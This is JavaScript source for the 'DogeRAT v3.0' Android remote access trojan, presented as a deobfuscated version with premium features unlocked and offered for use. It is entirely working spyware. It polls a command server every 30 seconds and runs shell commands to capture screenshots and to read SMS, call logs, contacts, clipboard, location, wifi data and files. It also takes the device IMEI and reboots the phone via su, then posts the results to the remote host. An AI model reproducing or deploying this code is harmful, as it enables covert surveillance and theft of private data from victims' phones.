// ===== DOGE RAT v3.0 — CLEAN DEOBFUSCATED VERSION =====
// Original DogeRAT server.js logic — cleaned, readable, premium unlocked.

// === Configuration loaded from data.json ===
let config = {
  host: "",      // будет загружено из data.json
  token: "",     // будет загружено из data.json
  id: "",        // будет загружено из data.json
  premium: true  // ← ВСЕГДА РАЗБЛОКИРОВАН
};

// === Load config from data.json ===
function loadConfig() {
  try {
    // В Android WebView это читается через fetch('assets/data.json')
    fetch('assets/data.json')
      .then(res => res.json())
      .then(data => {
        config.host = data.host;
        config.token = data.token;
        config.id = data.id;
      })
      .catch(e => console.error('Failed to load data.json:', e));
  } catch (e) {
    console.error('Config load error:', e);
  }
}

// === Device info ===
let deviceInfo = {
  model: "",
  brand: "",
  android: "",
  imei: ""
};

function getDeviceInfo() {
  try {
    // Эти вызовы должны быть реализованы в Android-приложении через @JavascriptInterface
    deviceInfo.model = nativeCall("getprop", "ro.product.model") || "Unknown";
    deviceInfo.brand = nativeCall("getprop", "ro.product.brand") || "Unknown";
    deviceInfo.android = nativeCall("getprop", "ro.build.version.release") || "Unknown";
    deviceInfo.imei = nativeCall("service", "iphonesubinfo", "1") || "Unknown";
    config.id = deviceInfo.imei.replace(/\D/g, '').substring(0, 15) || "fallback_id";
  } catch (e) {
    console.log("DeviceInfo error:", e);
  }
}

// === Native shell call (must be implemented in Android) ===function nativeCall(...args) {
  if (window.Android && typeof window.Android.callShell === 'function') {
    return window.Android.callShell(args.join(' '));
  }
  // Fallback for testing
  return `[SIMULATED] ${args.join(' ')}`;
}

// === Command execution ===
function executeCommand(action, args) {
  switch (action) {
    case 'screenshot':
      return takeScreenshot();
    case 'sms':
      return getSms();
    case 'location':
      return getLocation();
    case 'reboot':
      return rebootDevice();
    case 'clipboard':
      return getClipboard();
    case 'apps':
      return getApps();
    case 'calls':
      return getCalls();
    case 'wifi':
      return getWifi();
    case 'contacts':
      return getContacts();
    case 'file_list':
      return getFileList();
    case 'device_info':
      return getDeviceInfoFull();
    default:
      return `Unknown command: ${action}`;
  }
}

function takeScreenshot() {
  return nativeCall('screencap', '-p', '/sdcard/screen.png');
}

function getSms() {
  return nativeCall('content', 'query', '--uri', 'content://sms/inbox', '--projection', '_id,address,body,date');
}

function getLocation() {
  return nativeCall('dumpsys', 'location');
}
function rebootDevice() {
  return nativeCall('su', '-c', 'reboot');
}

function getClipboard() {
  return nativeCall('dumpsys', 'clipboard');
}

function getApps() {
  return nativeCall('pm', 'list', 'packages');
}

function getCalls() {
  return nativeCall('content', 'query', '--uri', 'content://call_log/calls', '--projection', 'number,date,duration');
}

function getWifi() {
  return nativeCall('dumpsys', 'wifi');
}

function getContacts() {
  return nativeCall('content', 'query', '--uri', 'content://contacts/people', '--projection', 'display_name,contact_status');
}

function getFileList() {
  return nativeCall('ls', '-la', '/sdcard');
}

function getDeviceInfoFull() {
  return JSON.stringify(deviceInfo);
}

// === Send report to server ===
function sendReport(result) {
  fetch(`${config.host}/report?id=${config.id}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ result })
  }).catch(e => console.error('Send report error:', e));
}

// === Check for commands from server ===
function checkForCommands() {
  fetch(`${config.host}/check?id=${config.id}`)
    .then(res => res.json())
    .then(data => {
      if (data.action && data.action !== 'none') {
        const result = executeCommand(data.action, data.args || []);
        sendReport(result);
      }    })
    .catch(e => console.error('Check command error:', e));
}

// === Initialization ===
function init() {
  loadConfig();
  getDeviceInfo();
  // Check every 30 seconds
  setInterval(checkForCommands, 30000);
}

// Start on load
init();